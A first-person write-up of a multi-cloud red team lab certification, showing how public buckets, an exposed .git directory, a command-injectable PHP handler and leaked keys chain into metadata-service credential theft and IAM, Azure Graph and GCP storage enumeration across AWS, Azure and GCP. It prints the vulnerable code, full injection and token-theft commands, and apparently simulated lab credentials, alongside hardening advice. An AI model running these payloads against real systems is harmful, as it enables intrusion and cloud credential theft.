# What Multi\-Cloud Red Team Analyst \(MCRTA\) Taught Me About Chaining Cloud Misconfigurations

**Made and wrote by Austin BC**

Completing CyberWarFare Labs’ Multi\-Cloud Red Team Analyst \(MCRTA\) gave me a useful way to compare offensive security work across Amazon Web Services \(AWS\), Microsoft Azure, and Google Cloud Platform \(GCP\)\. The assessment combines cloud fundamentals with practical, flag based exercises in a simulated organization called CWL Meta Tech\. The interesting part was not just finding isolated weaknesses\. It was seeing how public assets, exposed application code, cloud identities, and storage permissions connected into a larger path\.

The training is arranged into three cloud modules with ten assessment questions each\. The official materials introduce cloud architecture and authentication, service enumeration, common misconfigurations, and practical red team operations\. I approached it as an exercise in understanding permissions and trust relationships, not just as a set of answers to collect\.

![MCRTA completion certificate](assets/mcrta-certificate.png)

*My CyberWarFare Labs MCRTA completion certificate\.*

## Attack Techniques Covered

The labs covered cloud reconnaissance and open source intelligence \(OSINT\), anonymous S3 bucket discovery, DNS enumeration, exposed Git repositories, and a leaked GCP service account key in a CI/CD pipeline\. The application testing involved server side request forgery \(SSRF\) and operating system command execution through unsafe PHP input handling, followed by access to instance metadata and temporary cloud credentials\. Subsequent enumeration examined AWS IAM users, policies, and role trust; Azure managed identity tokens, role assignments, and Microsoft Graph; and GCP service accounts, project IAM bindings, and Cloud Storage\. The documented work identified potential privilege and lateral movement paths, but did not establish that every discovered trust relationship was exploited\.

## Preparing for a Practical Cloud Assessment

MCRTA is built around AWS, Azure, and GCP rather than a single vendor\. That matters because the same general problems appear under different names\. AWS uses IAM roles and policies, Azure uses Entra identities and role assignments scoped to resources, and GCP uses service accounts and IAM bindings across projects and resources\. Before moving into the lab paths, I focused on understanding who an identity was, which permissions it held, how it obtained credentials, and what those permissions allowed it to read\.

Command line familiarity was especially helpful\. The draft notes use AWS CLI, curl, Gobuster, git\-dumper, Python, and gcloud, with Cloud Resource Manager and Microsoft Graph APIs used directly when the relevant cloud token was available\. RedCloudOS is part of the CWL lab workflow, but the underlying commands and API behavior are worth learning independently\. The course material also recommends PowerShell and Bash familiarity, rather than requiring previous cloud security experience\.

![CWL multi-cloud lab architecture](assets/lab-architecture.png)

*CWL course architecture illustration showing the three cloud environments\. Source: CyberWarFare Labs course material included in the submitted drafts\.*

One common address appeared throughout these notes: 169\.254\.169\.254, the link local endpoint used for instance metadata in these cloud environments\. The weakness was not that metadata exists\. The issue was that a vulnerable application could be used to make requests from inside a VM and obtain tokens or role credentials that the external visitor should never receive\. The credentials differed by platform, but the path from an exposed service to cloud identity enumeration stayed recognizable\.

## AWS: From a Public S3 Bucket to IAM Role Discovery

### Finding the public bucket and the development host

The AWS portion began without cloud credentials\. I used bucket name enumeration against the CWL Meta Tech naming pattern\. The cloud\_enum result identified the openly accessible S3 bucket cwl\-metatech\-prod\.

```
git clone https://github.com/initstring/cloud_enum.git
pip3 install -r cloud_enum/requirements.txt
python3 cloud_enum/cloud_enum.py -k cwl-metatech --disable-azure --disable-gcp
```

The bucket URL was http://cwl\-metatech\-prod\.s3\.amazonaws\.com/\. The bucket exposed dev\-server\-ip\.txt, staging\-data\.txt, and prod\-data\.txt\. These filenames made the storage issue relevant beyond simple discovery\. One file revealed the development server address, while another contained simulated financial records\.

```
aws s3 cp s3://cwl-metatech-prod/prod-data.txt - --no-sign-request
```

The bucket’s development server file identified the host as 18\.222\.161\.152\. They also recorded the assessment’s first answer as the bucket URL and its tenth as the card number 6271701225979642 from Bob’s record in prod\-data\.txt\. The latter was a lab flag inside the simulated dataset, not a recommendation to handle real payment information this way\. The wider record also included Alex, Lisa, and David; I retained the specific question evidence rather than reproducing all four payment records unnecessarily\.

### The exposed Git directory revealed the vulnerable PHP handler

With the host identified, the next step was to retrieve the Git history exposed by the web server\. A publicly accessible \.git directory can reveal application source and configuration even when a normal browser page shows little about the backend\. Here, the retrieved source pointed directly to process\.php\.

```
pip3 install git-dumper
git-dumper http://18.222.161.152/.git /tmp/gitdump
```

The retrieved application code was small enough to explain both issues without speculating about other endpoints:

```
<?php
$ip = $_POST['ip'];
$content = file_get_contents($ip);
$org = $_POST['organization'];
$org_output = system($org);
echo $org_output, $content;
?>
```

The ip field flowed into file\_get\_contents\(\) without destination validation, giving the handler an SSRF primitive when remote URLs were accepted\. The organization field was sent directly to system\(\), making it a separate command execution problem\. The AWS lab’s second answer was therefore the parameter ip\. The source code also explained why an attacker would not need to guess which field was interesting\.

### Using the application to reach EC2 instance metadata

The next request used command execution through organization to query the EC2 instance metadata endpoint\. This is important to distinguish from simply requesting an arbitrary URL through the SSRF field\. The request used the application’s command execution behavior to run curl on the host itself\.

```
curl -s -X POST "http://18.222.161.152/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' 
```

The response named ec2\-role\. That result established the IAM role attached to the instance, which was the third assessment answer\. The following request targeted the specific role’s credentials rather than just the metadata directory\.

```
curl -s -X POST "http://18.222.161.152/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role' 
```

The metadata response reported a successful request with the temporary key material below\. The session token was already truncated in the source document, so this is preserved evidence rather than a complete reusable credential set:

```
{
  "Code": "Success",
  "AccessKeyId": "ASIATQGVY3V5ZIVFIUEQ",
  "SecretAccessKey": "VWGLgRZnNj4spEDc+CuOgJB4U0D3M7/KuPvp+uz0",
  "Token": "IQoJb3JpZ2lu...",
  "Expiration": "2026-07-28T01:34:03Z"
}
export AWS_ACCESS_KEY_ID=ASIATQGVY3V5ZIVFIUEQ
export AWS_SECRET_ACCESS_KEY=VWGLgRZnNj4spEDc+CuOgJB4U0D3M7/KuPvp+uz0
export AWS_SESSION_TOKEN=<complete-temporary-token-from-lab-response>
aws sts get-caller-identity
```

The STS result showed account 240966491515 with ARN arn:aws:sts::240966491515:assumed\-role/ec2\-role/i\-0c95b6744d7501b40\. This is the point where the assessment moved from an exposed web application into cloud identity discovery\. The recorded credential values were temporary and the token was already shortened in the source material\. I have not treated the snippet as a currently working login\.

### Reading IAM users, group memberships, and role trust

With the instance identity established, the next step was IAM enumeration\. The IAM enumeration used these commands, each answering a different question:

```
aws iam get-group --group-name interns
aws iam list-groups-for-user --user-name emp003
aws iam get-role --role-name crossaccount-role
aws iam get-role --role-name dev-role
aws iam list-user-policies --user-name emp001
aws iam list-attached-group-policies --group-name employees
```

The interns group contained int001, while emp003 belonged to employees\. User emp001 had an inline policy called s3\-administrator\-Policy, and employees had arn:aws:iam::aws:policy/AmazonDevOpsGuruFullAccess attached\. Together these were the fourth, fifth, eighth, and ninth AWS assessment results\. What mattered more than the individual names was that a role reached through the instance metadata path could read enough IAM information to map the account’s identity relationships\.

The two role trust documents were especially revealing\. crossaccount\-role trusted arn:aws:iam::058264439561:user/manager, identifying the external AWS account 058264439561\. The dev\-role document trusted arn:aws:iam::240966491515:role/devops\-role within the same account\. The external account ID was the sixth answer, and dev\-role was the seventh\.

```
# Excerpt from crossaccount-role trust policy
"Principal": {"AWS": "arn:aws:iam::058264439561:user/manager"},
"Action": "sts:AssumeRole"

# Excerpt from dev-role trust policy
"Principal": {"AWS": "arn:aws:iam::240966491515:role/devops-role"},
"Action": "sts:AssumeRole"
```

Those results exposed potential lateral movement relationships, but the captured notes do not show a successful sts:AssumeRole call or a session in the second account\. I would describe this as trust enumeration and lateral movement path discovery, not a completed cross account compromise\.

### What I would harden in the AWS path

The most direct preventative work would start with removing anonymous access to the bucket, restricting access to the development host, and making \.git unreachable through the web server\. The unsafe PHP calls also need to be removed or replaced with strict application logic: an allowlist of approved destinations for outbound requests and no use of untrusted organization input as a shell command\. Filtering private addresses alone would not solve redirect or DNS rebinding problems\.

For EC2 metadata, the draft includes the following proposed change\. This is a recommended hardening command, not a change shown as executed during the examination:

```
aws ec2 modify-instance-metadata-options \
  --instance-id i-0c95b6744d7501b40 \
  --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1
```

Requiring IMDSv2 would prevent the simple tokenless metadata read recorded here, although it would not repair arbitrary server command execution\. IAM permissions on ec2\-role should also be reduced to what that application actually needs, and role trust policies should be reviewed before they become unintended cross account access paths\. I would validate the fixes with application logs, CloudTrail identity activity, and S3 object access records where enabled\. The drafts propose these controls but do not contain evidence that they were deployed or tested\.

## Azure: Following a Managed Identity into RBAC and Microsoft Graph

### Discovering a publicly reachable internal hostname

The Azure module opened with DNS enumeration for meta\-tech\.cloud\. The source record shows Gobuster resolving both www\.meta\-tech\.cloud and internal\.meta\-tech\.cloud\. The more interesting hostname was internal\.meta\-tech\.cloud, which responded publicly despite being named as though it were internal infrastructure\.

```
gobuster dns --domain meta-tech.cloud \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --threads 20 --resolver 8.8.8.8 --timeout 5s 2>/dev/null | grep -v ERROR

curl -sI http://internal.meta-tech.cloud/
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
```

The exposed hostname was the first Azure answer\. As in the AWS notes, the draft describes an accessible Git directory leading to process\.php, with the same ip and organization handling problems\. There is no separate Azure Git dump command or output in the uploaded material, so the source leakage is retained as a documented observation, not expanded into an invented discovery sequence\.

### Retrieving the Azure managed identity token

Azure returned a different credential type\. The application command execution path was used to query the instance metadata service with the Metadata:true header and request a token for the Azure Resource Manager audience\.

```
MGMT_RESP=$(curl -s -X POST "http://internal.meta-tech.cloud/CSP-1/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"')
MGMT_TOKEN=$(echo "$MGMT_RESP" | python3 -c "import sys,json;o,_=json.JSONDecoder().raw_decode(sys.stdin.read());print(o['access_token'])")
```

The response supplied a JWT\. Its decoded claims are preserved here, not the full JWT\. In particular, the issuer, tenant, object identity, and managed resource ID placed the identity within an Azure tenant, subscription, resource group, and VM\.

```
{
  "iss": "https://sts.windows.net/68b40a4c-50f1-48f3-b7cb-916dd82418a7/",
  "tid": "68b40a4c-50f1-48f3-b7cb-916dd82418a7",
  "oid": "3c19c764-a8dd-492d-bae8-0b2146630ab1",
  "xms_mirid": "/subscriptions/4ebaca3d-8642-4a01-b544-e62550598323/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm"
}
```

The issuer URL was the second Azure answer, tenant ID 68b40a4c\-50f1\-48f3\-b7cb\-916dd82418a7 was the third, and subscription ID 4ebaca3d\-8642\-4a01\-b544\-e62550598323 was the fourth\. The xms\_mirid claim was especially useful because one string linked the identity to the IT\-RG resource group and it\-vm instance\. A token with a different requested resource would be needed for Microsoft Graph; the Management API token was not interchangeable with it\.

### Checking subscription access and a custom role

The next documented calls queried Azure Resource Manager\. The original notes extract the access\_token from the application response, set the subscription and object IDs, and filter role assignments for that object\. These excerpts preserve the assessment’s API path and filter:

```
SUB="4ebaca3d-8642-4a01-b544-e62550598323"
OID="3c19c764-a8dd-492d-bae8-0b2146630ab1"

curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$OID'" \
  | python3 -m json.tool
```

The output identified the built in Reader role using definition GUID acdd72a7\-3385\-48ef\-bd42\-f606fba81ae7, assigned at subscription scope\. Reader was the fifth answer\. The role definition lookup was:

```
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7?api-version=2022-04-01" \
  | python3 -m json.tool | grep roleName
"roleName": "Reader"
```

The notes then searched for custom\-role\-definition and recorded role definition GUID 3073a810\-518a\-273e\-97d6\-c30abcf852cd\. Its scope was the VM path under IT\-RG, ending in providers/Microsoft\.Compute/virtualMachines/it\-vm, which was the sixth answer\. The custom role action Microsoft\.Resources/subscriptions/resourceGroups/read was the seventh\. These are read permissions and metadata exposure findings; nothing in the provided record shows they were used to modify a resource\.

```
curl -s -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01&\$filter=roleName+eq+'custom-role-definition'" \
  | python3 -m json.tool

"actions": ["Microsoft.Resources/subscriptions/resourceGroups/read"]
```

### Moving from Resource Manager to Entra ID information

I then requested a second metadata token for https://graph\.microsoft\.com/\. This distinguishes the identity’s permissions in Azure Resource Manager from its possible access to directory information through Microsoft Graph\.

```
GRAPH_RESP=$(curl -s -X POST "http://internal.meta-tech.cloud/CSP-1/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"')
GRAPH_TOKEN=$(echo "$GRAPH_RESP" | python3 -c "import sys,json;o,_=json.JSONDecoder().raw_decode(sys.stdin.read());print(o['access_token'])")
```

With the corresponding GRAPH\_TOKEN, I looked up the IT Ops group, its members, an application named prod\-app, and a separate dev\-app registration\.

```
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?\$filter=displayName+eq+'IT+Ops'"

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/$GROUP_ID/members?\$select=displayName,mail,userPrincipalName"

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?\$filter=displayName+eq+'prod-app'"

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/$APP_OBJECT_ID/owners?\$select=displayName,userPrincipalName"
```

The IT Ops member email was it@meta\-tech\.cloud, the eighth Azure answer\. For prod\-app, the owner display name was IT, the ninth\. The dev\-app manifest included a Microsoft Graph app role corresponding to User\.Read\.All, the tenth answer\. I also inspected service principal permissions using Microsoft Graph’s application ID 00000003\-0000\-0000\-c000\-000000000000:

```
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?\$filter=displayName+eq+'dev-app'"

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId+eq+'00000003-0000-0000-c000-000000000000'&\$select=appRoles,oauth2PermissionScopes"
Scope: User.ReadWrite
AppRole: User.Read.All
```

That distinction matters: a permission appearing under requiredResourceAccess is a requested application permission, not by itself proof that an administrator granted consent or that a separate client successfully used it\. The captured material supports discovery of the app role and the directory objects listed above\. It does not document a mass directory export or actual exploitation of User\.Read\.All by dev\-app\.

### What I would harden in the Azure path

The Azure entry point requires the same application level fixes as AWS: remove public Git history access, eliminate unsafe command execution, and validate outbound requests against a tightly controlled destination allowlist\. The “internal” application should also be moved behind appropriate network access controls rather than being publicly reachable by name alone\.

For identities, I would review the VM’s managed identity and narrow broad subscription scope wherever operationally possible, then check custom roles and the Graph permissions requested by application registrations\. Requests for tokens aimed at Management and Graph have different audiences, and the defensive review needs to cover both planes\. Azure audit logs, application access logs, and unexpected enumeration by workload identities are useful places to look\. Those are recommendations in the drafts, not remediations shown as completed\.

## GCP: A Pipeline Key Became an Infrastructure Map

### Finding a service account key in a public pipeline

The Google Cloud module began with public source code rather than a bucket or DNS result\. The repository was cwl\-metatech/production\-data and pipeline\.yml as the place where a service account key appeared as the base64 encoded ENCRYPTED\_GCP\_KEY variable\. Base64 is encoding, not a secure way to protect a credential committed to a repository\.

```
curl -s "https://raw.githubusercontent.com/cwl-metatech/production-data/main/pipeline.yml" \
  | grep -oP '(?<=ENCRYPTED_GCP_KEY=")[^"]+' \
  | base64 -d | python3 -m json.tool
{
  "type": "service_account",
  "project_id": "mcrta-exam",
  "client_email": "dev-service-account@mcrta-exam.iam.gserviceaccount.com"
}
```

The repository URL was the first GCP answer and the project ID mcrta\-exam was the second\. The leaked credential belonged to dev\-service\-account@mcrta\-exam\.iam\.gserviceaccount\.com, which mattered because even a service account with narrow permissions can reveal what to investigate next\.

### Authenticating and enumerating the VM

The exported JSON contained escaped newline characters in the JSON private key required normalization before authentication\. The following command preserves that parsing step from the draft, followed by the recorded gcloud authentication and instance enumeration commands\.

```
curl -s "https://raw.githubusercontent.com/cwl-metatech/production-data/main/pipeline.yml" \
  | grep -oP '(?<=ENCRYPTED_GCP_KEY=")[^"]+' | base64 -d \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
data['private_key'] = data['private_key'].replace('\\n', '\n')
print(json.dumps(data, indent=2))
" > /tmp/dev-sa-key.json

gcloud auth activate-service-account --key-file=/tmp/dev-sa-key.json
gcloud config set project mcrta-exam
gcloud compute instances list --project mcrta-exam
NAME           ZONE            MACHINE_TYPE   EXTERNAL_IP    STATUS
stag-instance  us-central1-b   n1-standard-1   34.27.221.40  RUNNING
```

The VM name stag\-instance was the third GCP answer\. A follow up instance inspection showed the assigned identity vm\-service\-account@mcrta\-exam\.iam\.gserviceaccount\.com, the fourth\. The exact recorded instance lookup was:

```
gcloud compute instances describe stag-instance --zone us-central1-b \
  --project mcrta-exam --format="get(serviceAccounts)"
```

This discovery is why the leaked key mattered even without administrator privileges\. The dev account’s custom role was later identified as VMReadgek with compute\.instances\.list, which made VM discovery possible and revealed the external address used for the next stage\.

### Reaching the GCP metadata token from the application

The staging VM hosted process\.php, and the next request used the organization parameter invoking curl\. This time the metadata request required the Metadata\-Flavor:Google header and the service account token endpoint\.

```
curl -s -X POST "http://34.27.221.40/process.php" \
  -d "url=x&date=2024-01-01&ip=x" \
  --data-urlencode 'organization=curl -s -H "Metadata-Flavor:Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"' 
```

The output was described as an OAuth2 bearer token belonging to the VM’s service account\. In the captured notes, that token is used as VM\_TOKEN for the Resource Manager and Cloud Storage calls\. The different permissions of the development service account and the instance service account are central to the GCP module: the leaked key located the target, while the VM token offered access to other APIs\.

### Mapping project roles and custom permissions

The Resource Manager query obtained the project IAM policy\. The draft’s response identified roles/reader for the VM service account and a custom project role, projects/mcrta\-exam/roles/VMReadgek, attached to the development service account\.

```
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  -X POST -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/mcrta-exam:getIamPolicy" \
  -d "{}" | python3 -m json.tool
{
  "bindings": [
    {
      "role": "roles/reader",
      "members": ["serviceAccount:vm-service-account@mcrta-exam.iam.gserviceaccount.com"]
    },
    {
      "role": "projects/mcrta-exam/roles/VMReadgek",
      "members": ["serviceAccount:dev-service-account@mcrta-exam.iam.gserviceaccount.com"]
    }
  ]
}
```

The VM service account’s project level roles/reader was the fifth GCP answer\. The development service account mapped to VMReadgek was the sixth, and the permission compute\.instances\.list was the seventh\. The role definition was checked separately:

```
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://iam.googleapis.com/v1/projects/mcrta-exam/roles/VMReadgek" \
  | python3 -m json.tool
"includedPermissions": ["compute.instances.list"]
```

The eighth answer in the source draft is also recorded as roles/reader, described there as the development service account’s VM level role\. The supplied IAM policy excerpt proves roles/reader for the VM service account at project scope, but does not itself show a VM level binding granting it to the development service account\. I have preserved the recorded answer while keeping that evidence gap explicit instead of silently changing which identity held the role\.

### Reading the Cloud Storage object

The final GCP stage used the VM token to list storage buckets, enumerate objects, and retrieve a text file\. The bucket returned by the captured call was stag\-storage\-metatech\-prod11, the ninth answer\.

```
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=mcrta-exam" \
  | python3 -m json.tool | grep '"name"'

curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/stag-storage-metatech-prod11/o" \
  | python3 -c "import sys,json;[print(o['name']) for o in json.load(sys.stdin).get('items',[])]"
"name": "stag-storage-metatech-prod11"
license-key.txt
```

With the object name known, the final request retrieved license\-key\.txt through the Storage API:

```
curl -s -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/stag-storage-metatech-prod11/o/license-key.txt?alt=media"
V13JG-NPH5M-S97JM-9MPGT-3S66T
```

That license string was the tenth GCP answer\. More importantly, it demonstrated the difference between simply discovering infrastructure and successfully reading a cloud stored object\. The VM identity had enough effective permissions to reach this file, whereas the original leaked development identity was used to locate the instance and its service account\.

### What I would harden in the GCP path

The first priority would be to revoke and rotate the exposed development service account key, remove it from repository history, and replace long lived keys with a supported workload identity approach where possible\. Secret scanning in version control and CI/CD is a natural part of that control\. A service account does not need broad administrative rights to become useful reconnaissance material if it can identify running systems\.

I would then correct the web application behavior, review the VM’s attached service account, and limit its IAM scope and Cloud Storage access to the required resources\. For monitoring, project IAM policy reads, unusual service account usage, and object data access are the relevant signals to correlate\. As with the other modules, the drafts describe these as guardrails and proposed follow up work rather than verified changes deployed in the lab\.

## The Difference Between the Three Credential Paths

The main comparison that stayed with me is that the three modules did not use one universal credential format\. AWS IMDSv1 returned temporary access key material that the AWS CLI could use with a session token\. Azure returned audience specific managed identity access tokens, with separate Resource Manager and Microsoft Graph requests\. GCP supplied OAuth2 tokens through the metadata service, while the initial GitHub leak also exposed a JSON service account key for gcloud authentication\. Understanding the expected credential format was as important as finding the endpoint\.

The identity maps differed too\. AWS enumeration revealed users, groups, inline and attached policies, and role trust documents\. Azure exposed subscription scope Reader access, a custom role definition, and Entra application and group metadata\. GCP tied together the leaked development identity, VM service account, project role bindings, and a Storage object\. Those are different API and policy models, but the security question stayed the same: what could a low privilege entry point reveal, and which trust or permission boundary would the next request cross?

I also had to separate evidence from possibility\. The AWS notes identified an external principal trusted by crossaccount\-role, not a completed assume role operation\. The Azure notes resolved User\.Read\.All in an app manifest, not a proven granted application session using that permission\. And the GCP notes contained one VM level role answer without the corresponding binding in the displayed output\. Preserving those distinctions makes the article more useful than treating every discovered permission as an already exploited path\.

## What I Took Away from MCRTA

The practical value of MCRTA was seeing how a sequence develops\. An open bucket or a public repository may look like a small error in isolation\. Once it reveals the next host, endpoint, identity, or service account, the scope of the investigation changes\. The work becomes less about collecting tools and more about reading what the environment is telling you: source code points to an input, input handling points to an execution context, and a cloud token points to permissions\.

My strongest recommendation for someone preparing for this assessment is to learn the structure of the three platforms before memorizing commands\. Know how to inspect identities and permissions, get comfortable with aws, gcloud, curl, and basic shell pipelines, and practice interpreting IAM trust and role assignment responses\. CWL’s RedCloudOS is useful for the packaged exercises, but being able to explain why a command matters is what turns a captured flag into a real technical lesson\.

The official CyberWarFare Labs course and lab material supplied the learning framework\. For additional reading during preparation, the submitted notes also refer to the public CloudSec MCRTA notes maintained by h4md153v63n and a separate MCRTA review by Hamdi Sevben\. Those are external reference materials, not evidence that I executed every technique described in them\. The concrete assessment commands, answers, and observations in this article were consolidated from the four drafts I retained for this writeup\.

Official course: https://cyberwarfare\.live/product/multi\-cloud\-red\-team\-analyst\-mcrta/
Supplementary technical notes: https://github\.com/h4md153v63n/CloudSec/tree/main/01\_MCRTA
Supplementary review: https://hamdisevben\.medium\.com/multi\-cloud\-red\-team\-analyst\-mcrta\-dff807d3f3a3
